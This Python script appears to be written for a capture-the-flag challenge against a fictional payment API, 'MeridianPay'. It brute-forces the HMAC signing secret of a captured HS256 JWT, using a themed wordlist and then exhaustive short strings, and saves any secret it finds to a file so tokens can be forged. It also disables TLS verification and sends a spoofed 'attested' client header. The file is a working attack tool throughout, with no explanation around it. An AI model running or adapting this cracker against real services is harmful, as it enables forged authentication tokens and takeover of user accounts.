import base64, hmac, hashlib, json, urllib.request, urllib.error, ssl, itertools, sys

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CLIENT = "MeridianPay-Android/3.2.1 (attested)"

def req(path, method="GET", body=None, token=None, client=CLIENT):
    h = {"Content-Type": "application/json"}
    if client: h["X-Meridian-Client"] = client
    if token: h["Authorization"] = "Bearer " + token
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE+path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=8) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

REF = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwiaWF0IjoxNzkwNDA1MDc3LCJleHAiOjE3OTA0OTE0Nzd9.gqT6WsJe13hA9L7M_viCPQxKiiKoDkNSMk2lc_8_iso"
h0, p0, s0 = REF.split(".")
signing = (h0+"."+p0).encode()
target = base64.urlsafe_b64decode(s0 + "="*(-len(s0)%4))

WORDS = """meridian meridianpay meridian-pay MeridianPay MERIDIAN meridianpayio meridian.io pay
secret secretkey jwt_secret jwtsecret mysecret supersecret supersecretkey topsecret hush hushkey
changeme password password1 hunter2 admin root test testing dev develop development prod production
staging key sign signature hs256 hmac meridiansecret meridianpaysecret meridian_pay meridianpay2026
neobank bank banking fintech attested attestation client android app receipt promo loyalty ledger
h7ctf H7CTF flag ctf docker secret1 secret12 secret123 s3cr3t s3cr3t0 secret_key secret-key
meridiankey mp meridianmobile mobile phone trust everyone 3.2.1 v3.2.1""".split()

cands = set(WORDS)
for w in list(cands):
    cands |= {w+w, w+"!", w+"1", w+"2026", w+"2025", w.capitalize(), w.upper(), w+"secret", "secret"+w, w+"_key", w+"-key"}
for a,b in itertools.product(["meridian","meridianpay","mp","pay","neobank"], ["secret","key","jwt","123","2026","changeme"]):
    for sep in ["","-","_"]: cands |= {a+sep+b, a+sep+b+"!"}

print("candidate count", len(cands))
found = None
for s in cands:
    if hmac.compare_digest(hmac.new(s.encode(), signing, hashlib.sha256).digest(), target):
        found = s; break
if not found:
    import string
    extra = []
    alphabet = string.ascii_lowercase+string.digits
    for n in range(1,5):
        for t in map("".join, itertools.product(alphabet, repeat=n)):
            extra.append(t)
            if hmac.compare_digest(hmac.new(t.encode(), signing, hashlib.sha256).digest(), target):
                found=t; break
        if found: break
print("SECRET:", found)
if found:
    json.dump({"secret":found}, open("jwt_secret.json","w"))
